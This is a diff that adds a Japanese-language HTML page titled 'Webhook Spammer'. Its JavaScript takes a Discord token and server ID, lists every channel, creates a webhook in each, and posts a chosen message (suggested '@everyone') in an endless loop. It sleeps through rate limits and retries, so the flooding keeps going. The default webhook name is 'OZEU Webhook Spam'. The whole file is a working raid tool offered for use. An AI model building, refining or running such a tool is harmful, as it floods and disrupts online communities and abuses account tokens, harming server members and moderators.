@@ -1,0 +1,145 @@
+<h2>Webhook Spammer</h2>
+<form id="form">
+  <label>
+    Token:
+    <input type="text" id="token" required placeholder="Webhook作成用のトークン">
+  </label>
+  <label>
+    サーバーID:
+    <input type="text" id="guildId" required placeholder="1362131922347622462">
+  </label>
+  <label>
+    Webhook名:
+    <input type="text" id="webhookName" placeholder="Captain Hook">
+  </label>
+  <label>
+    メッセージ内容:
+    <textarea id="message" placeholder="@everyone"></textarea>
+  </label>
+  <div class="button-container">
+    <button type="submit" id="submitBtn" class="primary">実行</button>
+    <button type="button" id="stopBtn" class="secondary">停止</button>
+  </div>
+</form>
+<div id="log" style="white-space: pre-wrap; max-height: 300px; overflow-y: auto;"></div>
+
+<script>
+let stopSpam = false;
+
+// ログ出力
+function log(msg) {
+  const logEl = document.getElementById("log");
+  logEl.textContent += `\n${new Date().toLocaleTimeString()} - ${msg}`;
+  logEl.scrollTop = logEl.scrollHeight;
+}
+
+// Webhook送信
+async function spamWebhook(url, message) {
+  while(!stopSpam){
+    try {
+      const res = await fetch(url, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ content: message })
+      });
+
+      if(res.status === 429){ // レート制限
+        const data = await res.json();
+        log(`⏳ レート制限: ${data.retry_after}s`);
+        await new Promise(r => setTimeout(r, data.retry_after * 1000));
+      } else if(res.status >= 200 && res.status < 300){
+        log("✅ 送信成功");
+      } else {
+        log(`❌ 送信失敗: status ${res.status}`);
+        break;
+      }
+    } catch(e) { log(`❌ 送信エラー: ${e.message}`); }
+  }
+}
+
+// Webhook作成
+async function createWebhook(token, channelId, webhookName, message){
+  const headers = { Authorization: token, 'Content-Type': 'application/json' };
+
+  try {
+    const res = await fetch(`https://discord.com/api/v9/channels/${channelId}/webhooks`, { headers });
+    if(res.status === 429){
+      const data = await res.json();
+      log(`⏳ 取得レート制限: ${data.retry_after}s`);
+      await new Promise(r => setTimeout(r, data.retry_after * 1000));
+      return createWebhook(token, channelId, webhookName, message);
+    }
+
+    const webhooks = await res.json();
+    const existing = webhooks.find(w => w.name === webhookName);
+
+    if(existing){
+      log(`🔄 既存Webhook検出: ${existing.url}`);
+      spamWebhook(existing.url, message);
+      return;
+    }
+
+    // 新規Webhook作成
+    const createRes = await fetch(`https://discord.com/api/v9/channels/${channelId}/webhooks`, {
+      method: 'POST',
+      headers,
+      body: JSON.stringify({ name: webhookName })
+    });
+
+    if(createRes.status === 429){
+      const data = await createRes.json();
+      log(`⏳ 作成レート制限: ${data.retry_after}s`);
+      await new Promise(r => setTimeout(r, data.retry_after * 1000));
+      return createWebhook(token, channelId, webhookName, message);
+    }
+
+    const newWebhook = await createRes.json();
+    log(`🚀 Webhook作成: ${newWebhook.url}`);
+    spamWebhook(newWebhook.url, message);
+
+  } catch(e){
+    log(`❌ 作成失敗: ${e.message}`);
+  }
+}
+
+// メイン処理
+async function main(token, guildId, webhookName, message){
+  stopSpam = false;
+  try {
+    log("🔄 チャンネル取得中...");
+    const res = await fetch(`https://discord.com/api/v9/guilds/${guildId}/channels`, { headers: { Authorization: token } });
+    const channels = (await res.json()).map(c => c.id);
+    log(`🔀 対象チャネル: ${channels.join(", ")}`);
+
+    for(const id of channels){
+      if(stopSpam) break;
+      createWebhook(token, id, webhookName, message);
+    }
+  } catch(e){
+    log(`❌ ${e.message}`);
+  }
+}
+
+// ボタン操作
+document.getElementById("form").addEventListener("submit", e => {
+  e.preventDefault();
+  const token = document.getElementById("token").value.trim();
+  const guildId = document.getElementById("guildId").value.trim();
+  const webhookName = document.getElementById("webhookName").value.trim() || "OZEU Webhook Spam";
+  const message = document.getElementById("message").value.trim();
+
+  const btn = document.getElementById("submitBtn");
+  btn.disabled = true;
+  btn.textContent = "実行中...";
+
+  main(token, guildId, webhookName, message);
+});
+
+document.getElementById("stopBtn").addEventListener("click", () => {
+  stopSpam = true;
+  log("🛑 停止しました");
+  const btn = document.getElementById("submitBtn");
+  btn.disabled = false;
+  btn.textContent = "実行";
+});
+</script>
